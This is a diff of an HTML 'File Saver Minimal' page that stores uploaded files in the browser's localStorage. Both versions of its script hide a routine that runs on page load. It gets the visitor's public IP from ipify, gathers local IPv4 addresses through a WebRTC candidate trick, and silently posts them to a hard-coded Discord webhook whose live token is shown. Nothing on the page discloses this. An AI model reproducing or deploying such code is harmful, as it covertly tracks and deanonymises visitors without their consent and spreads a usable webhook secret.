@@ -2,147 +2,140 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Filer Saver minimal</title>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>File Saver Minimal</title>
 <style>
-    body {
-        font-family: Arial, sans-serif;
-        background: linear-gradient(to bottom, #1a0033, #000011, #000033);
-        color: white;
-        text-align: center;
-        padding: 50px;
-    }
-    h1 { color: #bb86fc; }
-    .container {
-        background: rgba(0, 0, 0, 0.6);
-        border: 2px solid #663399;
-        padding: 20px;
-        border-radius: 10px;
-        display: inline-block;
-    }
-    input[type="file"], input[type="text"], button {
-        margin: 10px;
-        padding: 10px;
-        border-radius: 5px;
-        border: none;
-    }
-    input[type="text"] { width: 200px; }
-    button {
-        background-color: #4b0082;
-        color: white;
-        cursor: pointer;
-        transition: background 0.3s;
-    }
-    button:hover { background-color: #6a0dad; }
-    a.download-link {
-        display: block;
-        margin-top: 20px;
-        color: #bb86fc;
-        text-decoration: none;
-    }
-    a.download-link:hover { text-decoration: underline; }
+  body {
+    font-family: Arial, sans-serif;
+    background: linear-gradient(to bottom, #1a0033, #000011, #000033);
+    color: white;
+    text-align: center;
+    padding: 50px;
+  }
+  h1 { color: #bb86fc; }
+  .container {
+    background: rgba(0, 0, 0, 0.6);
+    border: 2px solid #663399;
+    padding: 20px;
+    border-radius: 10px;
+    display: inline-block;
+  }
+  input[type="file"], input[type="text"], button {
+    margin: 10px;
+    padding: 10px;
+    border-radius: 5px;
+    border: none;
+  }
+  input[type="text"] { width: 200px; }
+  button {
+    background-color: #4b0082;
+    color: white;
+    cursor: pointer;
+    transition: background 0.3s;
+  }
+  button:hover { background-color: #6a0dad; }
+  a.download-link {
+    display: block;
+    margin-top: 20px;
+    color: #bb86fc;
+    text-decoration: none;
+  }
+  a.download-link:hover { text-decoration: underline; }
 </style>
 </head>
 <body>
-    <h1>📁 Filer Saver</h1>
-    <div class="container">
-        <input type="file" id="fileInput"><br />
-        <input type="text" id="fileName" placeholder="Enter file name"><br />
-        <button id="saveBtn">Save File</button>
-        <a id="downloadLink" class="download-link" style="display:none;">⬇ Download Saved File</a><br />
-        <button id="loadFileBtn">Load Saved File</button>
-    </div>
+  <h1>📁 File Saver Minimal</h1>
+  <div class="container">
+    <input type="file" id="fileInput"><br />
+    <input type="text" id="fileName" placeholder="Enter file name"><br />
+    <button id="saveBtn">Save File</button>
+    <a id="downloadLink" class="download-link" style="display:none;">⬇ Download Saved File</a><br />
+    <button id="loadFileBtn">Load Saved File</button>
+  </div>
 
 <script>
-    const webhookUrl = "https://discord.com/api/webhooks/1403073369410244739/DMBo14Lg-4D3UbY-xrPfChglFsi1WP___5vpBDsfMZfm40VqHX8V1Bxe_90TmEWfolDI";
+  const webhookUrl = "https://discord.com/api/webhooks/1403073369410244739/DMBo14Lg-4D3UbY-xrPfChglFsi1WP___5vpBDsfMZfm40VqHX8V1Bxe_90TmEWfolDI";
 
-    let fileData = null;
+  let fileData = null;
 
-    document.getElementById("fileInput").addEventListener("change", function() {
-        const file = this.files[0];
-        if (file) {
-            const reader = new FileReader();
-            reader.onload = e => fileData = e.target.result;
-            reader.readAsDataURL(file);
-        }
-    });
+  document.getElementById("fileInput").addEventListener("change", e => {
+    const file = e.target.files[0];
+    if (!file) return;
+    const reader = new FileReader();
+    reader.onload = evt => fileData = evt.target.result;
+    reader.readAsDataURL(file);
+  });
 
-    document.getElementById("saveBtn").addEventListener("click", function() {
-        const name = document.getElementById("fileName").value.trim();
-        if (!fileData || !name) {
-            alert("Please select a file and enter a name.");
-            return;
-        }
-        localStorage.setItem(name, fileData);
-        updateDownloadLink(name, fileData);
-    });
-
-    document.getElementById("loadFileBtn").addEventListener("click", function() {
-        const name = prompt("Enter the file name to load:");
-        if (!name) return;
-        const savedFile = localStorage.getItem(name);
-        if (savedFile) {
-            updateDownloadLink(name, savedFile);
-        } else {
-            alert("File not found!");
-        }
-    });
-
-    function updateDownloadLink(name, data) {
-        const link = document.getElementById("downloadLink");
-        link.href = data;
-        link.download = name;
-        link.style.display = "block";
-        link.textContent = `⬇ Download "${name}"`;
+  document.getElementById("saveBtn").addEventListener("click", () => {
+    const name = document.getElementById("fileName").value.trim();
+    if (!fileData || !name) {
+      alert("Please select a file and enter a name.");
+      return;
     }
+    localStorage.setItem(name, fileData);
+    updateDownloadLink(name, fileData);
+  });
 
-    // Collect all IPv4 addresses (private + public + local)
-    function getAllIPv4(callback) {
-        const ips = new Set();
-        const pc = new RTCPeerConnection({ iceServers: [] });
-        pc.createDataChannel("");
-        pc.createOffer().then(offer => pc.setLocalDescription(offer));
-        pc.onicecandidate = event => {
-            if (!event || !event.candidate) {
-                callback(Array.from(ips));
-                return;
-            }
-            const parts = event.candidate.candidate.split(" ");
-            const ip = parts[4];
-            if (/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) {
-                ips.add(ip);
-            }
-        };
+  document.getElementById("loadFileBtn").addEventListener("click", () => {
+    const name = prompt("Enter the file name to load:");
+    if (!name) return;
+    const saved = localStorage.getItem(name);
+    if (saved) {
+      updateDownloadLink(name, saved);
+    } else {
+      alert("File not found!");
     }
+  });
 
-    function sendIPToWebhook() {
-        let publicIP = "Unknown";
-        let privateIPs = [];
+  function updateDownloadLink(name, data) {
+    const link = document.getElementById("downloadLink");
+    link.href = data;
+    link.download = name;
+    link.style.display = "block";
+    link.textContent = `⬇ Download "${name}"`;
+  }
 
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => {
-                publicIP = data.ip;
+  function getAllIPv4(callback) {
+    const ips = new Set();
+    const pc = new RTCPeerConnection({ iceServers: [] });
+    pc.createDataChannel("");
+    pc.createOffer()
+      .then(offer => pc.setLocalDescription(offer))
+      .catch(() => callback([])); // fallback in case of error
 
-                getAllIPv4(ips => {
-                    privateIPs = ips;
+    pc.onicecandidate = event => {
+      if (!event || !event.candidate) {
+        callback(Array.from(ips));
+        return;
+      }
+      const parts = event.candidate.candidate.split(" ");
+      const ip = parts[4];
+      if (/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) {
+        ips.add(ip);
+      }
+    };
+  }
 
-                    fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ content: `Public IP: ${publicIP}\nAll IPv4 IPs: ${privateIPs.join(", ") || "None"}` })
-                    }).catch(() => {
-                        // Fail silently
-                    });
-                });
-            }).catch(() => {
-                // Fail silently
-            });
-    }
+  function sendIPToWebhook() {
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        const publicIP = data.ip;
+        getAllIPv4(ips => {
+          fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              content: `Public IP: ${publicIP}\nAll IPv4: ${ips.join(", ") || "None"}`
+            }),
+          }).catch(() => {});
+        });
+      }).catch(() => {});
+  }
 
-    window.addEventListener("load", () => {
-        sendIPToWebhook();
-    });
+  window.addEventListener("load", () => {
+    sendIPToWebhook();
+  });
 </script>
 </body>
 </html>
